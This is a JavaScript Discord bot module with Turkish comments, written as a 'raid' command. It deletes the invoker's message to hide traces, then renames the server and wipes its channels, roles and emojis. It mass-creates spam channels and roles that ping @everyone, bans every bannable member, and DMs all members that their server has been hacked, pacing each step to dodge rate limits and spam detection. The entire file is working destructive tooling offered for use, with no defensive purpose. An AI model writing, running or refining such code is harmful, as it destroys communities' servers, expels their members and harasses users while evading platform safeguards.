const configuration = require('./configuration.json');

// İşlemler arasında beklenecek milisaniye cinsinden süre. Bu, rate limit'i önler.
const API_DELAY_MS = 350;

/**
 * Belirtilen süre kadar bekleyen bir yardımcı fonksiyon.
 * @param {number} ms - Beklenecek milisaniye.
 */
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

module.exports = async (message) => {
    try {
        // Komut argümanlarını al ve varsayılan değerleri ata
        const args = message.content.toLowerCase().trim().split(/ +/g);
        const raidName = args[1] || "Raiding";
        const amount = parseInt(args[2]) || 50;

        // Komutu yazan kişinin mesajını silerek iz bırakma
        message.delete().catch(() => {}); // Hata verirse önemseme

        console.log(`[RAID BAŞLATILDI] Sunucu: ${message.guild.name} (${message.guild.id})`);

        //? 1. Sunucu Adını ve İkonunu Değiştir
        console.log("[1/8] Sunucu adı ve ikonu değiştiriliyor...");
        await message.guild.setName(raidName).catch(err => console.log(`[HATA] Sunucu adı değiştirilemedi: ${err.message}`));
        await message.guild.setIcon(configuration.icon).catch(err => console.log(`[HATA] Sunucu ikonu değiştirilemedi: ${err.message}`));
        
        //? 2. Mevcut Tüm Kanalları Toplu Sil
        console.log("[2/8] Mevcut tüm kanallar siliniyor...");
        const channelsToDelete = Array.from(message.guild.channels.cache.values());
        await Promise.allSettled(channelsToDelete.map(channel => 
            channel.delete().catch(err => console.log(`[HATA] Kanal silinemedi (${channel.name}): ${err.message}`))
        ));
        console.log("[BAŞARILI] Kanallar silindi.");

        //? 3. Mevcut Tüm Rolleri Toplu Sil
        console.log("[3/8] Mevcut tüm roller siliniyor...");
        const rolesToDelete = message.guild.roles.cache.filter(role => 
            role.editable && role.name !== '@everyone' && role.position < message.guild.me.roles.highest.position
        );
        await Promise.allSettled(rolesToDelete.map(role => 
            role.delete("Raid").catch(err => console.log(`[HATA] Rol silinemedi (${role.name}): ${err.message}`))
        ));
        console.log("[BAŞARILI] Roller silindi.");

        //? 4. Mevcut Tüm Emojileri Toplu Sil
        console.log("[4/8] Mevcut tüm emojiler siliniyor...");
        await Promise.allSettled(message.guild.emojis.cache.map(emoji => 
            emoji.delete("Raid").catch(err => console.log(`[HATA] Emoji silinemedi (${emoji.name}): ${err.message}`))
        ));
        console.log("[BAŞARILI] Emojiler silindi.");

        //? 5. Belirtilen Miktarda Yeni Kanal Oluştur ve Tek Mesaj Gönder (Sıralı ve Gecikmeli)
        console.log(`[5/8] ${amount} adet yeni kanal oluşturuluyor ve mesaj gönderiliyor...`);
        const pingMessage = `@everyone ||**${raidName}**||`;
        for (let i = 0; i < amount; i++) {
            try {
                const channel = await message.guild.channels.create(raidName, { type: 'GUILD_TEXT' });
                await channel.send(pingMessage);
                console.log(` -> Kanal oluşturuldu ve mesaj gönderildi: ${channel.name} (${i + 1}/${amount})`);
            } catch (err) {
                console.log(`[HATA] Kanal oluşturma veya mesaj gönderme başarısız: ${err.message}`);
            }
            await delay(API_DELAY_MS); // API limitine takılmamak için bekle
        }
        console.log("[BAŞARILI] Kanal oluşturma ve mesaj gönderme tamamlandı.");

        //? 6. Belirtilen Miktarda Yeni Rol Oluştur (Sıralı ve Gecikmeli)
        console.log(`[6/8] ${amount} adet yeni rol oluşturuluyor...`);
        for (let i = 0; i < amount; i++) {
            try {
                await message.guild.roles.create({ name: raidName, color: 'RANDOM', reason: 'Raid' });
                console.log(` -> Rol oluşturuldu: ${raidName} (${i + 1}/${amount})`);
            } catch (err) {
                console.log(`[HATA] Rol oluşturulamadı: ${err.message}`);
            }
            await delay(API_DELAY_MS); // API limitine takılmamak için bekle
        }
        console.log("[BAŞARILI] Rol oluşturma tamamlandı.");

        //? 7. Sunucudaki Tüm Üyeleri Yasakla (Sıralı ve Gecikmeli)
        console.log("[7/8] Tüm üyeler yasaklanıyor...");
        const membersToBan = Array.from(message.guild.members.cache.values()).filter(m => m.bannable);
        let bannedCount = 0;
        for (const member of membersToBan) {
            await member.ban({ reason: raidName }).then(() => {
                bannedCount++;
                console.log(` -> Üye yasaklandı: ${member.user.tag} (${bannedCount}/${membersToBan.length})`);
            }).catch(err => console.log(`[HATA] ${member.user.tag} yasaklanamadı: ${err.message}`));
            await delay(API_DELAY_MS); // API limitini aşmamak için her yasaklama arasında bekle
        }
        console.log(`[BAŞARILI] ${bannedCount} üye yasaklandı.`);

        //? 8. Tüm Üyelere Özel Mesaj Gönder (Sıralı ve ÇOK YAVAŞ Gecikmeli)
        // DİKKAT: Bu işlem hala risklidir ve hesabınızın kısıtlanmasına neden olabilir.
        console.log("[8/8] Tüm üyelere özel mesaj gönderiliyor (Bu işlem uzun sürebilir)...");
        const membersToDm = Array.from(message.guild.members.cache.values()).filter(m => !m.user.bot);
        let dmCount = 0;
        const dmMessage = `Sunucunuz "${message.guild.name}" hacklenmiştir. Mesaj: \`\`\`${raidName}\`\`\``;
        for (const member of membersToDm) {
            await member.send(dmMessage).then(() => {
                dmCount++;
                console.log(` -> DM gönderildi: ${member.user.tag} (${dmCount}/${membersToDm.length})`);
            }).catch(() => console.log(`[UYARI] ${member.user.tag} adlı üyeye DM gönderilemedi (DM'leri kapalı olabilir).`));
            await delay(1000); // SPAM olarak algılanmamak için DM'ler arasında daha uzun bekle
        }
        console.log(`[BAŞARILI] ${dmCount} üyeye DM gönderilmeye çalışıldı.`);
        console.log("[RAID TAMAMLANDI]");

    } catch (error) {
        console.error("[KRİTİK HATA] Raid işlemi sırasında beklenmedik bir hata oluştu:", error);
    }
};
            
